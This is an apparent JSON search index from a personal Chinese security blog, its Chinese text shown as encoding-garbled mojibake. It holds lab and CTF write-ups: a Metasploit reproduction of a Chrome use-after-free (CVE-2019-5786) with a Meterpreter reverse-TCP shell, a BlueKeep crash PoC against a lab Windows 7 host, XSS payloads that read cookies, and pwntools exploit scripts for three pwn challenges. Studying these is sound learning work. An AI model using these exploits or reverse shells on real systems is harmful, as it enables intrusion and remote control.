é€šè¿‡httpå¤´éƒ¨ä¸­çš„refereræ¥é™åˆ¶é¡µé¢ï¼ˆä¿®æ”¹ä¸ªäººä¿¡æ¯çš„refererå¿…é¡»æ¥è‡ªæœ¬åŸŸï¼Œä¸å¯æ¥è‡ªå…¶ä»–åŸŸæˆ–æ— refererï¼‰ å¢åŠ éªŒè¯ç ï¼šä¸€èˆ¬ç”¨åœ¨ç™»å½•ï¼ˆé˜²æš´åŠ›ç ´è§£ï¼‰ï¼Œä¹Ÿå¯ç”¨äºå…¶ä»–é‡è¦ä¿¡æ¯æ“ä½œçš„è¡¨å•ä¸­ã€‚","categories":[],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"}]},{"title":"CVE-2019-5786","slug":"CVE-2019-5786","date":"2022-08-09T08:02:35.739Z","updated":"2022-08-09T08:03:08.820Z","comments":true,"path":"2022/08/09/CVE-2019-5786/","link":"","permalink":"https://sinky.top/2022/08/09/CVE-2019-5786/","excerpt":"","text":"å‰è¨€ï¼š è¿™ä¸ªæ¼æ´æ˜¯æˆ‘ç¬¬ä¸€ä¸ªè‡ªå·±è¿›è¡Œå¤ç°å’Œå°è¯•å†™expçš„æ´ï¼Œæˆ‘å¸Œæœ›åœ¨æœªæ¥æˆ‘èƒ½å¤Ÿå¯¹äºå¤ç°æ¼æ´å’Œå†™expèƒ½åƒåƒé¥­å–æ°´ä¸€æ ·è‡ªä¿¡ï¼åŠ æ²¹ï¼ ç¯å¢ƒkali win7_x86 Google_chrome_(32bit)_v72.0.3626.119 æµè§ˆä¸‹è½½é“¾æ¥æ¨èï¼šhttps://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe å¤ç°ï¼škaliå¯åŠ¨msf,æœç´¢chrome_filereaderåˆ©ç”¨æ¨¡å—ã€‚(æ®è°·æ­Œå®˜æ–¹å…¬ç¤ºï¼ŒCVE-2019-5786æ˜¯ä½äºFileReaderä¸­çš„UAFæ¼æ´) root@kali:~# msfconsole -q msf5 &gt; search chrome_filereader æ³¨ï¼š1.msfconsole -q æ˜¯æŒ‡å¯åŠ¨å·¥å…·msfï¼Œ-q ä¸æ‰“å°æ²¡ç”¨çš„ä¸œè¥¿å‡ºæ¥ï¼ˆmsfå¯åŠ¨ç•Œé¢ï¼‰ä¹‹åå¯èƒ½éœ€è¦ä¸“é—¨æ•´ç†ä¸€ä¸‹æœ‰å…³msfå·¥å…·çš„çŸ¥è¯†ã€‚2.search chrome_filereaderæ­£åˆ™åŒ¹é…æœç´¢expã€‚expå­˜åœ¨åˆ™æµ®ç°ã€‚3.ä»€ä¹ˆæ˜¯UAFæ¼æ´ï¼šå†…å­˜ç ´åæ¼æ´ï¼Œé€šå¸¸å­˜åœ¨äºæµè§ˆå™¨ä¸­ï¼Œè¯¦ç»†å¯è§åšå®¢æ–‡ç« â€œUAFæ¼æ´ç®€å•å­¦ä¹ â€ å‡ºç°exp: exploit/filereader/browser/chrome_filereader_uaf ç®€å•äº†è§£FileReaderå¯¹è±¡çš„ç”¨æ³•Filereader å¯ä»¥å®ç°å¯¹æ–‡ä»¶å†…å®¹æˆ–è€…ç¼“å†²åŒºæ•°ï¼ˆBlobï¼‰çš„å¼‚æ­¥è¯»å– readyStateï¼šè¡¨ç¤ºè¯»å–çŠ¶æ€ empty,0,å°šæœªè¯»å– loading,1,æ­£åœ¨è¯»å– done,2,è¯»å–å®Œæˆ resultï¼šè¡¨ç¤ºè¯»å–ç»“æœï¼Œå…·ä½“æ ¼å¼ä¸è¯»å–æ–¹å¼æœ‰å…³ï¼š readAsArrayBuffer readAsBinaryString readAsDataURL readAsText onprogressï¼šå›è°ƒå‡½æ•° è¯»å–Blobè§¦å‘ å½“æ•°æ®è¾ƒå¤šæ—¶ä¼šå‘¨æœŸæ€§è§¦å‘å¤šæ¬¡ onloadendï¼šå›è°ƒå‡½æ•° è¯»å–æ“ä½œå®Œæˆæ—¶è§¦å‘ï¼Œä¸è®ºè¯»å–æˆåŠŸæˆ–å¤±è´¥ æŸ¥çœ‹æ¨¡å—ä¿¡æ¯ æ¼æ´ä»‹ç»ï¼š 123456789101112Payload information:Description: This exploit takes advantage of a use after free vulnerability in Google Chrome 72.0.3626.119 running on Windows 7 x86. The FileReader.readAsArrayBuffer function can return multiple references to the same ArrayBuffer object, which can be freed and overwritten with sprayed objects. The dangling ArrayBuffer reference can be used to access the sprayed objects, allowing arbitrary memory access from Javascript. This is used to write and execute shellcode in a WebAssembly object. The shellcode is executed within the Chrome sandbox, so you must explicitly disable the sandbox for the payload to be successful. é€‰æ‹©payload -&gt; set payload windows/meterpreter/reverse_tcp æ³¨ï¼šmeterpreter/reverse_tcpï¼šåŸºäºTCPçš„åå‘é“¾æ¥åå¼¹shellï¼Œè¯¦ç»†è§æ–‡ç« â€œåˆè¯†Meterpreterâ€ è®¾ç½®payloadå‚æ•°ï¼šLHOSTä¸ºkali ip -&gt; set LHOST 192.168.119.128 åˆ›å»ºæœåŠ¡ -&gt; set payload windows/meterpreter/reverse_tcp å¯åŠ¨æœåŠ¡ï¼šrun æˆ–è€…exploit åœ¨win7ä¸‹è¿›å…¥chromeæ–‡ä»¶ç›®å½•ï¼Œåœ¨ç›®å½•ä¸‹è¿›å»cmdï¼Œå¹¶ä»¥æ²™ç®±å…³é—­çŠ¶æ€æ‰§è¡Œchrome.exe -&gt; chrome.exe --no-sandbox åœ¨å¼¹å‡ºçš„chomeæµè§ˆå™¨ä¸­è®¿é—®kali ip: http://192.168.119.128:8080 kaliè·å¾—sessionsæŸ¥çœ‹sessionsåºå·ï¼Œé€šè¿‡åå¼¹shellåœ¨win7ä¸Šå¯æ‰§è¡Œå‘½ä»¤ã€‚å¤ç°ç»“æŸã€‚ åè®°åœ¨è·å–sessionæ—¶å€™æˆ‘é‡è§äº†å¾ˆå¤šå°é—®é¢˜å¯¼è‡´æˆ‘ä¸èƒ½è·å–ï¼Œæ¯”å¦‚win7åº”è¯¥æ˜¯x86ç³»ç»Ÿï¼Œæ¯”å¦‚win7çš„é˜²ç«å¢™å¿˜è®°å…³é—­äº†ï¼Œæ¯”å¦‚ç½‘é€Ÿå¤ªæ…¢ï¼Œåœ¨å†ç»æ— æ•°å´©æºƒç¬é—´æˆ‘æˆåŠŸçš„è·å–äº†session.è™½ç„¶åæ¥å†æ•´ç†wpçš„æ—¶å€™ï¼Œwin7ç³»ç»Ÿç”±äºè‡ªåŠ¨æ›´æ–°ï¼Œchrome119ç‰ˆæœ¬ä¹Ÿå‡çº§äº†ï¼Œåæ¥å†å®‰è£…å´æ­»æ´»å®‰è£…ä¸ä¸Šå»ï¼Œå·®ç‚¹å‡å¤©â€¦â€¦ EXPexpå¤ªé•¿äº†å¹¶ä¸”çœ‹ä¸æ‡‚ï¼Œç­‰æˆ‘åé¢æœ‰æœºä¼šå†æ•´ç†ã€‚è¿™è¾¹æ”¾å…¶ä»–å¤§ä½¬æ•´ç†å‡ºæ¥çš„expã€‚ https://github.com/exodusintel/CVE-2019-5786","categories":[],"tags":[{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://sinky.top/tags/chrome-bug/"}]},{"title":"CVE-2019-0708","slug":"CVE-2019-0708","date":"2022-08-09T04:25:01.135Z","updated":"2022-08-09T04:22:13.980Z","comments":true,"path":"2022/08/09/CVE-2019-0708/","link":"","permalink":"https://sinky.top/2022/08/09/CVE-2019-0708/","excerpt":"","text":"2019å¹´5æœˆ14æ—¥çˆ†å‡ºCVE-2019-0708æ¼æ´ï¼Œé«˜å±æ¼æ´ï¼Œå½±å“èŒƒå›´è¾ƒå¹¿ï¼Œé€šè¿‡è¿œç¨‹æ¡Œé¢ç«¯å£3389ï¼ŒRDPåè®®è¿›è¡Œæ”»å‡»ã€‚ å½±å“ç³»ç»Ÿï¼šwindows 2003ã€windows 2008ã€windows 2008 R2ã€windows xpã€win7 è“å±ç¯å¢ƒæ”»å‡»æœºï¼škali IPï¼š192.168.119.128 é¶æœºï¼šwin7 IP:192.168.119.139 (å¼€æ”¾3389ç«¯å£) å·¥å…·ï¼šRDPæ¼æ´æ‰«æå·¥å…·ã€MSF POCï¼šhttps://github.com/n1xbyte/CVE-2019-0708 å¤ç°nmapå¯¹win7ç«¯å£æ‰«æ: RDPå·¥å…·åœ¨win7ä¸Šæ‰«æé¶æœº:0708detector.exe -t 192.168.119.139 -p 3389 å¯åŠ¨MSFæŸ¥æ‰¾æ¼æ´ï¼š search 0708 åˆ©ç”¨æ¼æ´æ‰«ææ¨¡å—ï¼š use auxiliary/scanner/rdp/cve_2019_0708_bluekeep æŸ¥çœ‹å‚æ•°ï¼š show options è®¾ç½®é¶æœºIPï¼š set rhosts 192.168.119.139 è¿è¡Œï¼šrun æ¼æ´æ”»å‡»åœ¨kaliä¸­å®‰è£…pip3,å®‰è£…impacketåº“ã€‚ä¸‹è½½pocã€‚åˆ‡è¿›ç›®å½•CVE-2019-0708 å¼€å§‹æ”»å‡»ï¼š python3 crashpoc.py 192.168.119.139 64(ç³»ç»Ÿç±»å‹) æ”»å‡»æˆåŠŸï¼Œwin7å˜ä¸ºè“å±ã€‚ çŸ¥è¯†ç‚¹RDPåè®®RDP,è¿œç¨‹æ˜¾ç¤ºåè®®ã€‚ä¼ è¾“æ–¹å¼ï¼štcp/ipã€‚æä¾›äº†å®¢æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ã€‚æ˜ åƒä¼šè¯ã€‚åŸºæœ¬å±‚æ¬¡ç»“æ„ï¼š ç½‘ç»œè¿æ¥å±‚ï¼šRDPåè®®å»ºç«‹åœ¨tcp/ipåè®®ä¹‹ä¸Šï¼Œç”±äºä¼ è¾“çš„æ•°æ®é‡æ¯”è¾ƒå¤§ï¼Œå› æ­¤åœ¨åè®®çš„åº•å±‚é¦–å…ˆå®šä¹‰ä¸€å±‚ç½‘ç»œè¿æ¥å±‚ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªå®Œæ•´çš„RDPæ•°æ®é€»è¾‘åŒ…ï¼Œä»¥é¿å…ç”±äºç½‘ç»œåŒ…é•¿åº¦è¿‡é•¿è€Œè¢«åˆ†å‰²ä½¿æ•°æ®ä¸¢å¤±ã€‚ ISOæ•°æ®å±‚ï¼šåœ¨ç½‘ç»œè¿æ¥å±‚ä¹‹ä¸Šæ˜¯ISOæ•°æ®å±‚ï¼Œæ ‡è¯†RDPæ•°æ®çš„æ­£å¸¸è¿æ¥é€šä¿¡ã€‚ è™šæ‹Ÿé€šé“å±‚ï¼šåœ¨ISOæ•°æ®å±‚ä¹‹ä¸Šï¼ŒRDPåè®®å®šä¹‰ä¸€ä¸ªè™šæ‹Ÿé€šé“å±‚ï¼Œç”¨ä»¥æ‹†åˆ†æ ‡ç¤ºä¸åŒè™šæ‹Ÿé€šé“çš„æ•°æ®ï¼ŒåŠ å¿«å®¢æˆ·ç«¯å¤„ç†é€Ÿåº¦ï¼ŒèŠ‚çœå ç”¨ç½‘ç»œæ¥å£çš„æ—¶é—´ã€‚ åŠ å¯†è§£å¯†å±‚ï¼šåœ¨è™šæ‹Ÿé€šé“å±‚ä¹‹ä¸Šï¼ŒRDPå®šä¹‰ä¸€ä¸ªæ•°æ®åŠ å¯†è§£å¯†å±‚ï¼Œæ­¤å±‚ç”¨äºå¯¹æ‰€æœ‰çš„åŠŸèƒ½æ•°æ®è¿›è¡ŒåŠ å¯†è§£å¯†å¤„ç†ã€‚ åŠŸèƒ½æ•°æ®å±‚ï¼šåœ¨åŠ å¯†è§£å¯†å±‚ä¹‹ä¸Šæ˜¯åŠŸèƒ½æ•°æ®ï¼Œç”»é¢ä¿¡æ¯ï¼Œæœ¬åœ°èµ„æºè½¬æ¢ï¼Œå£°éŸ³æ•°æ®ï¼Œæ‰“å°æ•°æ®ç­‰æ‰€æœ‰çš„åŠŸèƒ½æ•°æ®ä¿¡æ¯éƒ½åœ¨æ­¤å±‚è¿›è¡Œå¤„ç†ã€‚å¦å¤–ï¼Œæ ¹æ®æ•°æ®ç±»å‹çš„ä¸åŒï¼Œè¿™äº›æ•°æ®éƒ½æœ‰å„è‡ªä¸åŒå±‚æ¬¡çš„åˆ†å‰²ï¼Œ è¿æ¥è¿‡ç¨‹è¯´æ˜ï¼š å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨ ISOæ•°æ®å±‚å»ºç«‹è¿æ¥ å‘é€åˆå§‹åè®®ç›¸å…³ä¿¡æ¯ï¼Œæ¥æ”¶åŠ å¯†ã€è§£å¯†ç§˜é’¥ è™šæ‹Ÿé€šé“ç”³è¯· åŠ å¯†å½¢å¼å‘é€å®¢æˆ·ç«¯ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒæ—¶éªŒè¯åŠ å¯†åè®® å¹³å°è½¯ä»¶è¯ä¹¦éªŒè¯ å„åŠŸèƒ½å»ºç«‹è¿æ¥ï¼Œå„åŠŸèƒ½æ•°æ®ä¼ è¾“ï¼ŒåŠŸèƒ½å®ç°ã€‚","categories":[],"tags":[{"name":"windowsæ¼æ´","slug":"windowsæ¼æ´","permalink":"https://sinky.top/tags/windows%E6%BC%8F%E6%B4%9E/"}]},{"title":"æ”»é˜²ä¸–ç•Œ-pwn-ååº”é‡œå¼€å…³æ§åˆ¶","slug":"æ”»é˜²ä¸–ç•Œ-pwn-ååº”é‡œå¼€å…³æ§åˆ¶","date":"2022-08-09T04:18:04.404Z","updated":"2022-08-11T14:19:42.897Z","comments":true,"path":"2022/08/09/æ”»é˜²ä¸–ç•Œ-pwn-ååº”é‡œå¼€å…³æ§åˆ¶/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/","excerpt":"","text":"checksec: å¯ä»¥ä¿®æ”¹GOTè¡¨ å¯ä»¥é€šè¿‡ä¸€å¤„çš„æ–¹å¼æ¥æ›´æ”¹ç¨‹åºè¿è¡Œæµ å †æ ˆä¸å¯æ‰§è¡Œ åœ°å€éšæœºåŒ–æœªå¼€å¯ åˆ†æIDAæŸ¥çœ‹ï¼Œå‘ç°æœ‰/bin/shã€‚ getå‡½æ•°å¯æº¢å‡ºï¼Œåç§»ç”±v5å¾—0x200h+0x8h(åç§»å¯¹é½)=0x208h expexp: from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive() åè®°çœ‹äº†ä¸€ä¸‹å¤§ä½¬çš„wpï¼Œç»“æœåŸæ¥æ˜¯ç›²æ‰“é¢˜â€¦â€¦","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"æœ‰å…³XSSè·¨ç«™è„šæœ¬","slug":"æœ‰å…³XSSè·¨ç«™è„šæœ¬","date":"2022-08-09T04:10:35.381Z","updated":"2022-08-09T04:10:16.791Z","comments":true,"path":"2022/08/09/æœ‰å…³XSSè·¨ç«™è„šæœ¬/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/","excerpt":"","text":"XSS(è·¨ç«™è„šæœ¬)åŸç†ä¸åˆ†ç±»è·¨ç«™è„šæœ¬æ”»å‡»XSS,ä¸ºäº†ä¸å’Œå±‚å æ ·å¼è¡¨çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSS,æ¶æ„æ”»å‡»è€…å¾€webé¡µé¢é‡Œæ’å…¥æ¶æ„scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆé¡µé¢æ—¶åµŒå…¥å…¶ä¸­çš„scriptä»£ç è¢«æ‰§è¡Œï¼Œä»è€Œæ¶æ„æ”»å‡»ç”¨æˆ·ã€‚ XSSæ”»å‡»é’ˆå¯¹çš„æ˜¯ç”¨æˆ·å±‚é¢çš„æ”»å‡». åå°„å‹ï¼šäº¤äº’çš„æ•°æ®ä¸€èˆ¬ä¸ä¼šè¢«å­˜åœ¨æ•°æ®åº“é‡Œï¼Œä¸€æ¬¡æ€§ï¼Œä¸€èˆ¬å‡ºç°åœ¨æŸ¥è¯¢é¡µé¢ç­‰ã€‚ å­˜å‚¨å‹ï¼šäº¤äº’çš„æ•°æ®ä¼šè¢«å­˜åœ¨æ•°æ®åº“é‡Œé¢ï¼Œæ°¸ä¹…æ€§å­˜å‚¨ï¼Œä¸€èˆ¬å‡ºç°åœ¨ç•™è¨€æ¿ï¼Œæ³¨å†Œç­‰é¡µé¢ã€‚ DOMå‹ï¼šä¸ä¸åå°æœåŠ¡å™¨äº§ç”Ÿæ•°æ®äº¤äº’ï¼Œæ˜¯ä¸€ç§é€šè¿‡DOMæ“ä½œå‰ç«¯ä»£ç è¾“å‡ºçš„æ—¶å€™äº§ç”Ÿçš„é—®é¢˜ï¼Œä¸€æ¬¡æ€§ï¼Œä¹Ÿå±äºåå°„å‹ã€‚ XSSæ¼æ´æµ‹è¯•æµç¨‹1.åœ¨ç›®æ ‡ä¸Šæ‰¾è¾“å…¥ç‚¹ï¼Œæ¯”å¦‚æŸ¥è¯¢æ¥å£ã€ç•™è¨€æ¿ 2.è¾“å…¥ä¸€ç»„â€œç‰¹æ®Šå­—ç¬¦ï¼ˆ&gt;,â€™,â€ç­‰ï¼‰+å”¯ä¸€è¯†åˆ«å­—ç¬¦â€ï¼Œç‚¹å‡»æäº¤åï¼ŒæŸ¥çœ‹è¿”å›æºç ï¼Œçœ‹åç«¯è¿”å›æ•°æ®æ˜¯å¦æœ‰å¤„ç†ã€‚ 3.é€šè¿‡æœç´¢å®šä½åˆ°å”¯ä¸€å­—ç¬¦ï¼Œç»“åˆå”¯ä¸€å­—ç¬¦å‰åè¯­æ³•ç¡®å®šæ˜¯å¦å¯ä»¥æ„é€ æ‰§è¡Œjsçš„è°ƒæ•™ï¼ˆæ„é€ é—­åˆï¼‰ 4.æäº¤æ„é€ çš„è„šæœ¬ä»£ç ï¼ˆä»¥åŠå„ç§ç»•è¿‡å§¿åŠ¿ï¼‰ï¼Œçœ‹æ˜¯å¦å¯ä»¥æˆåŠŸæ‰§è¡Œï¼ŒæˆåŠŸæ‰§è¡Œè¯æ˜å­˜åœ¨xssæ¼æ´ã€‚ XSSçš„æ”»å‡»è½½è· &lt;script&gt;ï¼šæœ€ç›´æ¥çš„xssæœ‰æ•ˆè½½è·ï¼Œè„šæœ¬æ ‡è®°å¯ä»¥å¼•ç”¨å¤–éƒ¨çš„javascriptä»£ç ï¼Œä¹Ÿå¯ä»¥å°†ä»£ç æ’å…¥è„šæœ¬æ ‡è®°ä¸­ã€‚ src12&lt;script&gt;alert(\"hack\")&lt;/script&gt; #å¼¹å‡ºhack&lt;script&gt;alert(document.cookie)&lt;/script&gt; #å¼¹å‡ºcookie &lt;img&gt;ï¼š1234567&lt;img src=1 onerror=alert(\"hack\")&gt;&lt;img src=1 onerror=alert(/hack/)&gt;&lt;img src=1 onerror=alert(document.cookie)&gt; #å¼¹å‡ºcookie&lt;img src=1 onerror=alert(123)&gt; æ³¨ï¼šå¯¹äºæ•°å­—ï¼Œå¯ä»¥ä¸ç”¨å¼•å·&lt;img src=\"javascript:alert(\"XSS\");\"&gt;&lt;img dynsrc=\"javascript:alert('XSS')\"&gt;&lt;img lowsrc=\"javascript:alert('XSS')\"&gt;","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://sinky.top/tags/XSS/"}]},{"title":"æ”»é˜²ä¸–ç•Œ-dice_game","slug":"æ”»é˜²ä¸–ç•Œ-pwn-dice_game","date":"2022-08-09T04:08:11.395Z","updated":"2022-08-11T14:24:30.121Z","comments":true,"path":"2022/08/09/æ”»é˜²ä¸–ç•Œ-pwn-dice_game/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/","excerpt":"","text":"0x01 Checkseclinuxä¸‹checksecæŸ¥å£³ï¼Œå¼€å¯äº†relro nx pieé˜²æŠ¤ï¼š 0x02 åˆ†æIDAæ‰“å¼€ï¼Œä¸»å‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3){ char buf[55]; // [rsp+0h] [rbp-50h] char v5; // [rsp+37h] [rbp-19h] ssize_t v6; // [rsp+38h] [rbp-18h] unsigned int seed[2]; // [rsp+40h] [rbp-10h] unsigned int v8; // [rsp+4Ch] [rbp-4h] memset(buf, 0, 0x30uLL); *(_QWORD *)seed = time(0LL); printf(\"Welcome, let me know your name: \", a2); fflush(stdout); v6 = read(0, buf, 0x50uLL); if ( v6 &lt;= 49 ) buf[v6 - 1] = 0; printf(\"Hi, %s. Let's play a game.\\n\", buf); fflush(stdout); srand(seed[0]); v8 = 1; v5 = 0; while ( 1 ) { printf(\"Game %d/50\\n\", v8); v5 = sub_A20(); fflush(stdout); if ( v5 != 1 ) break; if ( v5 ) { if ( v8 == 50 ) { sub_B28(buf); break; } ++v8; } } puts(\"Bye bye!\"); return 0LL;} æ˜¯ä¸€ä¸ªsrandå‡½æ•°ç¨‹åºï¼Œè¾“å…¥ä¸éšæœºå‡ºæ¥çš„æ•°åŒ¹é…ï¼Œåˆ™å°†è¿›å…¥flagçš„å‡½æ•°ã€‚ 12345678910int __fastcall sub_B28(__int64 a1){ char s; // [rsp+10h] [rbp-70h] FILE *stream; // [rsp+78h] [rbp-8h] printf(\"Congrats %s\\n\", a1); stream = fopen(\"flag\", \"r\"); fgets(&amp;s, 100, stream); puts(&amp;s); return fflush(stdout);} åœ¨è¾“å…¥nameæ—¶ï¼Œä»¤è¾“å…¥æ•°æ®è¦†ç›–srandå‡½æ•°å†…éƒ¨éšæœºç§å­ï¼Œå°±å¯ä»¥æ§åˆ¶éšæœºæ•°çš„ç”Ÿæˆã€‚ éšæœºæ ‘ç§å­åœ°å€ä¸è¾“å…¥åå­—çš„bufåœ°å€ä¹‹é—´ç›¸å·®0x40,æ‰€ä»¥å°†seedè¦†ç›–æ‰ 0x03 exp12345678910111213141516from pwn import *from ctypes import *p=remote('220.249.52.133',34691)libc=cdll.LoadLibrary(\"libc.so.6\")p.recv()payload=0x40*'a'+p64(0)p.sendline(payload)a=[]for i in range(50): a.append(libc.rand()%6+1)print(a)for i in a: p.recv() print(p.recv()) p.sendline(str(i))p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"æ”»é˜²ä¸–ç•Œ string","slug":"æ”»é˜²ä¸–ç•Œpwn-string","date":"2022-08-09T04:06:35.328Z","updated":"2022-08-11T14:24:17.566Z","comments":true,"path":"2022/08/09/æ”»é˜²ä¸–ç•Œpwn-string/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/","excerpt":"","text":"checksec æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ æ³¨ï¼šå¼€å¯Full RELROï¼Œæ— æ³•ä¿®æ”¹gotè¡¨ï¼›å¼€å¯Canary foundï¼Œä¸èƒ½ç›´æ¥ç”¨æº¢å‡ºæ–¹æ³•è¦†ç›–æ ˆä¸­è¿”å›åœ°å€ï¼Œè¦é€šè¿‡æ”¹å†™æŒ‡é’ˆä¸å±€éƒ¨å˜é‡ã€leak canaryã€overwrite canaryçš„æ–¹æ³•æ¥ç»•è¿‡ï¼›å¼€å¯NX,æ„å‘³ç€æ ˆä¸­æ•°æ®æ²¡æœ‰æ‰§è¡Œæƒé™ï¼›PIEæœªå¼€å¯ï¼ŒåŸºåœ°å€ä¸ä¼šå˜åŒ–ï¼Œä¸º0x400000. æ€è·¯åˆ†æIDA64æŸ¥çœ‹ï¼Œåœ¨sub_400CA6()ä¸­å‘ç°ï¼šv1è¢«å¼ºåˆ¶è½¬æ¢æˆå‡½æ•°æŒ‡é’ˆç±»å‹ã€‚ æ³¨ï¼š ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1); å°±æ˜¯å°†v1å¼ºåˆ¶è½¬æ¢ä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ å…¶æ»¡è¶³æ¡ä»¶ä¸º a1==a1[1]ï¼Œå›æº¯å‘ç°ï¼Œa1ä¸ºå‡½æ•°sub_400D72()å‡½æ•°çš„å‚æ•°ï¼Œå³ï¼Œa1ä¸ºv5. å¯çœ‹å‡ºï¼Œv4=v5,ä¸”*v4=68;v4[1]=85;ä¹Ÿå°±æ˜¯è¯´ï¼Œa1=68,a1[1]=85.æ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹a1å€¼ä»¤a1=85 æŒ‰æµç¨‹åˆ†æï¼šåœ¨sub_400A7D()ä¸­ï¼Œæ»¡è¶³s1==â€œeastâ€ï¼Œåˆ™è·³å‡ºå‡½æ•°ã€‚ åœ¨sub_400BB9()ä¸­å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆå¯ä»¥è¿›è¡Œä»»æ„åœ°å€æ”¹å†™ï¼‰ printf(&amp;format, &amp;format); é€šè¿‡æ­¤å¤„å¯ä¿®æ”¹v4[0]å€¼ï¼Œç°åœ¨éœ€è¦ç¡®å®šv4[0]åœ°å€ã€‚åœ¨main()å‡½æ•°ä¸­ï¼Œæ‰“å°çš„secret[0]æ­£æ˜¯v5,å³v4[0]åœ°å€ã€‚ æ”»å‡»æ€è·¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´èµ‹å€¼a1ä¸º85ï¼Œä½¿ifæ¡ä»¶æˆçœŸï¼Œæ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„shellcodeæ‹¿åˆ°shellã€‚ å‡½æ•°è°ƒç”¨çº¦å®šï¼šlinux_x64ä¸‹ï¼Œå‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨ï¼šRDI,RSI,RDX,ECX,R8,R9,å½“å‚æ•°ä¸º7ä¸ªä»¥ä¸Šæ—¶ï¼Œå‰é¢6ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œä½†åé¢çš„ä»¥æ­¤ä»â€œå³å‘å·¦â€æ”¾å…¥æ ˆä¸­ã€‚ åˆ©ç”¨pwntoolsè‡ªå¸¦çš„shellcodecraftå·¥å…·ï¼Œç”Ÿæˆamd64æ¶æ„ä¸‹çš„shellcodeï¼Œæ‹¿åˆ°shell. Pwntools shellcraftæ¨¡å—ï¼šæ˜¯shellcodeçš„æ¨¡å—ï¼ŒåŒ…å«ä¸€äº›ç”Ÿæˆshellcodeçš„å‡½æ•°ï¼Œå­æ¨¡å—å£°æ˜æ¶æ„ï¼ˆå¦‚ï¼šshellcode.armæ˜¯ARmæ¶æ„ï¼›shellcraft.amd64æ˜¯AMD64æ¶æ„ï¼›shellcraft.commonæ˜¯æ‰€æœ‰æ¶æ„é€šç”¨ï¼‰ printf(shellcraft.sh()) #æ‰“å°å‡ºshellcodeprintf(asm(shellcraft.sh())) #æ‰“å°å‡ºæ±‡ç¼–åçš„shellcode ç”¨gdbè°ƒè¯•ç¨‹åºï¼Œåœ¨printfä¸‹æ–­ç‚¹ï¼Œè¾“å…¥%xæµ‹è¯•ï¼Œå‘ç°è¾“å‡ºå¦‚å›¾ï¼š å¡«å†™addressæ—¶æˆ‘è¾“å…¥çš„æ˜¯56ï¼ˆ0x38ï¼‰ï¼Œä¹Ÿå°±æ˜¯[rsp+16]çš„ä½ç½®ï¼Œå³æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬7ä¸ªå‚æ•°ï¼ˆprintfçš„ç¬¬8ä¸ªå‚æ•°ï¼‰ conext.log_level=â€debugâ€ è„šæœ¬åœ¨æ‰§è¡Œæ—¶è¾“å‡ºdebugçš„ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡è§‚å¯Ÿè¿™äº›ä¿¡æ¯æŸ¥æ‰¾å“ªæ­¥å‡ºé”™ è¡¥ï¼šä¹‹å‰ä¸çŸ¥é“sh.recv(7),16æ˜¯ä»€ä¹ˆæ„æ€ï¼Œç°åœ¨è¡¥å……ï¼Œå°±æ˜¯sendlineè‡ªå¸¦æ¢è¡Œç¬¦ï¼Œæ‰€ä»¥è¦æŠŠ\\nè¿‡æ»¤æ‰ï¼Œ7æ˜¯å› ä¸ºv3å°±æ˜¯æ‰“å°çš„6ä¸ªä¹¦ï¼Œæ¢è¡Œç¬¦æ˜¯ç¬¬7ä½ï¼Œ16ä»£è¡¨åå…­è¿›åˆ¶ã€‚ expï¼š 1234567891011121314151617181920from pwn import* #sh=process('./string')sh=remote('111.198.29.45',36129)context.log_level='debug'sh.recvuntil('secret[0] is')v3_addr=int(sh.recv(7),16)sh.recvuntil('name be:')sh.sendline('zzz')sh.recvuntil('east or up?:')sh.sendline('east')sh.recvuntil('leave(0)?:')sh.sendline('1')sh.recvuntil('\\'Give me an address\\'')sh.sendline(str(v3_addr))sh.recvuntil('you wish is:')payload='%085c'+'%7$n'sh.sendline(payload)sh.recvuntil('I will help you! USE YOU SPELL')sh.sendline(asm(shellcraft.amd64.linux.sh(),arch=\"amd64\"))sh.interactive() 